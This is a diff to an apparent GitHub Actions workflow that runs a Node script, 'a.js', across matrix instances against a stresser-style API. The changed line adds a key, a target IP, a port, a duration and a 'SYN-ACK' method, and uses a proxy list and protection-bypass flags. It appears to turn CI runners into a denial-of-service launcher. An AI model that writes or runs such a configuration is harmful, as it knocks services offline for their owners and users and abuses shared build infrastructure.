@@ -32,6 +32,6 @@ jobs:
     
     - name: Run a.js (Instance ${{ matrix.instance }})
       run: |
-        node a.js GET  https://retrostress.net/api/start?key 700 4 1 proxy.txt  --bfm --auth --debug --cookie "bypass=%RAND%"  --delay 3 
+        node a.js GET  https://retrostress.net/api/start?key=Beiiw&target=12.2.3.4&port=80&time=60&method=SYN-ACK 700 4 1 proxy.txt  --bfm --auth --debug --cookie "bypass=%RAND%"  --delay 3 
 
 
